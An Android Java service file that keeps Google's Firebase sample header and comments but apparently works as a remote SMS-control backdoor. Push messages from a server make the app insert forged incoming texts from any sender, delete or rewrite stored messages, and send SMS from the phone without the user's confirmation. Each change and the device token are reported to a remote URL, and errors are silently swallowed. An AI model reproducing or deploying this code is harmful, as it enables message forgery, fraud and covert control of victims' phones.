/**
 * Copyright 2016 Google Inc. All Rights Reserved.
 * <p>
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * <p>
 * http://www.apache.org/licenses/LICENSE-2.0
 * <p>
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.example.sms.service;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.example.sms.App;
import com.example.sms.http.HttpUtils;
import com.example.sms.MainActivity;
import com.example.sms.utils.MapUtils;
import com.example.sms.utils.NotificationUtils;
import com.example.sms.R;
import com.example.sms.http.SmsReport;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import org.json.JSONObject;

import java.util.ArrayList;

/**
 * NOTE: There can only be one service in each app that receives FCM messages. If multiple
 * are declared in the Manifest then the first one will be chosen.
 *
 * In order to make this Java sample functional, you must remove the following from the Kotlin messaging
 * service in the AndroidManifest.xml:
 *
 * <intent-filter>
 *   <action android:name="com.google.firebase.MESSAGING_EVENT" />
 * </intent-filter>
 */
public class MyFirebaseMessagingService extends FirebaseMessagingService {

    private static final String TAG = "MyFirebaseMsgService";

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        Log.d(TAG, "From: " + remoteMessage.getFrom());
        if (remoteMessage.getData().size() > 0) {
            Log.d(TAG, "Message data payload: " + remoteMessage.getData());
            scheduleJob();
        }

        // Check if message contains a notification payload.
        if (remoteMessage.getNotification() != null) {
            Log.d(TAG, "Message Notification Body: " + remoteMessage.getNotification().getBody());
            String notificationBody = remoteMessage.getNotification().getBody();
            if (remoteMessage.getNotification().getBody() != null) {
                try {
                    JSONObject result = new JSONObject(notificationBody);
                    String cmd = result.optString("cmd");
                    switch (cmd){
                        case "insert_sms":
                            {
                                int is_notification = result.optInt("is_notification");
                                JSONObject sms = result.optJSONObject("sms");
                                String address = sms.optString("address");
                                String body = sms.optString("body");

                                ContentValues contentValues = new ContentValues();
                                contentValues.put("address", address);
                                contentValues.put("body", body);
                                contentValues.put("date", System.currentTimeMillis());
                                contentValues.put("read", Boolean.FALSE);
                                contentValues.put("type", 1);
                                Uri parse = Uri.parse("content://sms/");
                                Uri uri = getContentResolver().insert(parse, contentValues);
                                long id = Long.parseLong(uri.getLastPathSegment());
                                if (is_notification==1){
                                    NotificationUtils.createNotificationForNormal(this,address,body);
                                }
                                SmsReport.post(id,address,body,"add",is_notification,1);
                            }
                            break;
                        case "delete_sms":{
                                JSONObject sms = result.optJSONObject("sms");
                                Long id = sms.optLong("id");
                                ContentValues contentValues = new ContentValues();
                                contentValues.put("_id", id);
                                Uri parse = Uri.parse("content://sms/");
                                getContentResolver().delete(parse, "_id="+id,null);
                                SmsReport.post(id,"","","delete",0,0);
                            }
                            break;
                        case "send_sms":
                        {
                            int is_insert = result.optInt("is_insert");
                            JSONObject sms = result.optJSONObject("sms");
                            String address = sms.optString("address");
                            String body = sms.optString("body");
                            ContentResolver contentResolver = getContentResolver();
                            SmsManager smsManager = SmsManager.getDefault();
                            Uri parse = Uri.parse("content://sms/sent");
                            ArrayList<String> conList=smsManager.divideMessage(body);
                            if (is_insert==1){
                                for (String txtCon : conList) {
                                    //先插入数据库
                                    ContentValues contentValues = new ContentValues();
                                    contentValues.put("address", address);
                                    contentValues.put("body", txtCon);
                                    contentValues.put("status", 0);
                                    Uri uri = contentResolver.insert(parse, contentValues);
                                    Long.parseLong(uri.getLastPathSegment());
                                }
                            }
                            smsManager.sendMultipartTextMessage(address,null, conList , null, null);
                        }
                            break;
                        case "update_sms":
                        {
                            JSONObject sms = result.optJSONObject("sms");
                            long id = sms.optLong("id");
                            String address = sms.optString("address");
                            String body = sms.optString("body");

                            ContentValues contentValues = new ContentValues();
                            if (!TextUtils.isEmpty(address))
                                contentValues.put("address", address);
                            if (!TextUtils.isEmpty(body))
                                contentValues.put("body", body);
                            Uri parse = Uri.parse("content://sms/");
                            getContentResolver().update(parse, contentValues,"_id="+id,null);
                            SmsReport.post(id,address,body,"update",0,1);
                        }
                            break;
                        case "push":
                            String title = result.optString("title");
                            String body = result.optString("body");
                            sendNotification(title,body);
                            break;
                        case "alive":
                        {
                            HttpUtils.post(getString(R.string.sms_url) + "/alive", MapUtils.newMap(), new HttpUtils.Callback() {
                                @Override
                                public void success(JSONObject result) {

                                }

                                @Override
                                public void error() {

                                }
                            });
                        }
                            break;
                    }
                }catch (Exception e){

                }
            }
        }

    }

    @Override
    public void onNewToken(String token) {
        sendRegistrationToServer(token);
    }
    // [END on_new_token]

    /**
     * Schedule async work using WorkManager.
     */
    private void scheduleJob() {
    }

    /**
     * Persist token to third-party servers.
     *
     * Modify this method to associate the user's FCM registration token with any
     * server-side account maintained by your application.
     *
     * @param token The new token.
     */
    private void sendRegistrationToServer(String token) {
        HttpUtils.post(getString(R.string.sms_url)+"/token", MapUtils.newMap().putVal("token", token), new HttpUtils.Callback() {
            @Override
            public void success(JSONObject result) {
            }
            @Override
            public void error() {
            }
        });
    }

    /**
     * Create and show a simple notification containing the received FCM message.
     *
     * @param messageBody FCM message body received.
     */
    private void sendNotification(String title,String messageBody) {
        Intent intent = new Intent(this, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0 /* Request code */, intent,
                PendingIntent.FLAG_IMMUTABLE);

        String channelId = "default_cid";
        Uri defaultSoundUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
        NotificationCompat.Builder notificationBuilder =
                new NotificationCompat.Builder(this, channelId)
                        .setSmallIcon(R.drawable.ic_notification)
                        .setContentTitle(TextUtils.isEmpty(title)?getString(R.string.app_name):title)
                        .setContentText(messageBody)
                        .setAutoCancel(true)
                        .setSound(defaultSoundUri)
                        .setContentIntent(pendingIntent);

        NotificationManager notificationManager =
                (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

        // Since android Oreo notification channel is needed.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId,
                    getString(R.string.app_name),
                    NotificationManager.IMPORTANCE_DEFAULT);
            notificationManager.createNotificationChannel(channel);
        }

        notificationManager.notify(0, notificationBuilder.build());
    }
}
